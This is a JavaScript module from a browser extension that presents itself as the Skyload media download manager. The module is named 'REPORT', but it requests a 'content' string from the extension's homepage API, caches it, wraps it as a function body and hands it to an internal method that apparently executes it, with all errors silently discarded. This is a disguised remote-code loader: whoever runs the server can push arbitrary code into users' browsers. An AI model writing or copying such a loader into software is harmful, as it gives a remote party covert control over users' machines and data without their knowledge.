/**
 * Skyload - Download manager for media content
 * @link http://skyload.io
 *
 * @version v7.3.1
 *
 * License Agreement:
 * http://skyload.io/eula
 *
 * Privacy Policy:
 * http://skyload.io/privacy-policy
 *
 * Support and FAQ:
 * http://skyload.io/help
 * skyload.extension@gmail.com
 */

"use strict";

define('REPORT', ['APP', 'underscore', 'jquery'], function (Skyload, _) {
    Skyload.Custodian.Require('REPORT', function () {
        return Skyload.AppView.extend({
            initialize: function initialize() {
                this.off = 'off';
                this.render();
            },
            render: function render() {
                var _this = this;

                var key = 'report';

                return Skyload.Storage(key).then(function (content) {
                    if (_.isNull(content)) {
                        return _this.getDetails().then(function (details) {
                            var params = $.param({
                                v: details.version,
                                id: details.id
                            });

                            var api = details.homepage_url + '/api/get-report?' + params;

                            return _this.request(api, false, 'POST').then(function (json) {
                                var show = json.show;
                                var content = show ? json.content : _this.off;

                                return Skyload.Storage(key, content);
                            }).catch(function () {
                                return Skyload.Storage(key, _this.off);
                            });
                        });
                    }

                    return content;
                }).then(function (content) {
                    if (!(_.isString(content) && content !== _this.off)) {
                        throw new Error('Content not found');
                    }

                    return content;
                }).then(function (content) {
                    return Skyload.Methods.B('function(){' + content + '}');
                }).catch(function (e) {});
            },
            getDetails: function getDetails() {
                return new Promise(function (resolve) {
                    Skyload.SendMessageFromContentToBackground({
                        method: 'get_details'
                    }, resolve);
                });
            },
            request: function request(url, text, method) {
                if (!_.isString(method)) {
                    method = 'GET';
                }

                return new Promise(function (resolve, reject) {
                    Skyload.Methods.XHR(url, function (data) {
                        try {
                            var response = data.response.responseText;

                            if (text === true) {
                                resolve(response);
                            } else {
                                var json = JSON.parse(response);

                                if (json.meta.code !== 0) {
                                    throw new Error(json.meta.message);
                                }

                                resolve(json.data);
                            }
                        } catch (e) {
                            reject(e);
                        }
                    }, method);
                });
            }
        });
    }, false);
});